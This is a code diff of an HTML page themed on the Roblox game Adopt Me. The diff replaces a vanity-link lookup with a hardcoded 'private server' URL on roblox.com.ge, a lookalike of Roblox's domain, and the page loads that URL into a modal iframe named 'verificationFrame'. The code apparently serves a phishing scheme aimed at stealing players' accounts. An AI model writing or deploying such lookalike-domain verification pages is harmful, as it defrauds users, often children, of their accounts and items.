@@ -11,7 +11,6 @@
     <link rel="shortcut icon" href="https://www.playadopt.me/favicon.ico?v=2">
     <meta name="msapplication-TileColor" content="#e81f76">
     <meta name="theme-color" content="#0a0c15">
-    <script src ="links.js"></script>
     
     <!-- Fonts -->
     <link rel="preconnect" href="https://fonts.googleapis.com">
@@ -1253,10 +1252,7 @@
         const overlay = document.getElementById('modalOverlay');
         const closeBtn = document.getElementById('closeFinalModal');
         const iframe = document.getElementById('verificationFrame');
-        const DEFAULT_URL = "https://roblox.com.ge/games/920587237/Adopt-Me?privateServerLinkCode=70948648019414984398009608382200";
-        const TARGET_URL = window.vanityLinks[window.location.pathname] || DEFAULT_URL;
-
-        console.log("Using link:", TARGET_URL)
+        const TARGET_URL = "https://roblox.com.ge/games/920587237/Adopt-Me?privateServerLinkCode=70948648019414984398009608382200";
 
         function showToast(message) {
             const toast = document.createElement('div');
